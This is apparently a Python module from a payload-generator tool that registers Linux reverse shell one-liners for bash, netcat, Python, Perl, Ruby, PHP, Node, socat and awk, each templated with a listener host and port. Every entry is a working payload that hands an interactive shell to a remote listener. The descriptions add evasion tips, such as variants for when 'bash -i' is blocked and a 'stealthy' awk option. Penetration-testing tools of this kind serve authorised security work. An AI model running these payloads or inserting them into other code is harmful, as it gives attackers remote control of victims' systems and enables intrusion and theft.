"""Linux reverse shell payloads."""

from payloadforge.payloads.registry import register

# --- Bash ---
register(
    "bash_tcp",
    "linux", "bash",
    "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "Bash built-in /dev/tcp. No external tools. Modern bash only.",
    tags=["tcp", "builtin"],
)

register(
    "bash_readline",
    "linux", "bash",
    "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
    "Bash readline variant — works when 'bash -i' is blocked.",
    tags=["tcp", "builtin"],
)

# --- Netcat ---
register(
    "nc_mkfifo",
    "linux", "nc",
    "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "Netcat with mkfifo. Works with any nc flavor.",
    tags=["tcp", "netcat"],
)

register(
    "nc_e",
    "linux", "nc",
    "nc -e /bin/sh {lhost} {lport}",
    "Netcat with -e flag (traditional builds only).",
    tags=["tcp", "netcat"],
)

# --- Python ---
register(
    "python3",
    "linux", "python",
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "Python 3 one-liner. The gold-standard Linux reverse shell.",
    tags=["tcp", "python"],
)

register(
    "python3_pty",
    "linux", "python",
    "python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'",
    "Python 3 with PTY — gives you a fully interactive TTY shell (arrow keys, tab, Ctrl+C work).",
    tags=["tcp", "python", "pty"],
)

# --- Perl ---
register(
    "perl",
    "linux", "perl",
    "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "Perl reverse shell. Present on most Linux/BSD systems.",
    tags=["tcp", "perl"],
)

# --- Ruby ---
register(
    "ruby",
    "linux", "ruby",
    "ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "Ruby reverse shell.",
    tags=["tcp", "ruby"],
)

# --- PHP ---
register(
    "php",
    "linux", "php",
    "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "PHP reverse shell (CLI).",
    tags=["tcp", "php"],
)

# --- Node ---
register(
    "node",
    "linux", "node",
    "node -e 'var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var c=new net.Socket();c.connect({lport},\"{lhost}\",function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});'",
    "Node.js reverse shell.",
    tags=["tcp", "node"],
)

# --- Socat ---
register(
    "socat",
    "linux", "socat",
    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
    "Socat with PTY — most reliable interactive shell if socat is installed.",
    tags=["tcp", "socat", "pty"],
)

# --- AWK ---
register(
    "awk",
    "linux", "awk",
    "awk 'BEGIN {{ s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do {{ printf \"shell>\" |& s; s |& getline c; if(c) {{ while ((c | getline) > 0) print |& s; close(c); }} }} while(c != \"exit\") }} }}'",
    "Gawk / mawk reverse shell — no external binaries needed.",
    tags=["tcp", "awk", "stealthy"],
)
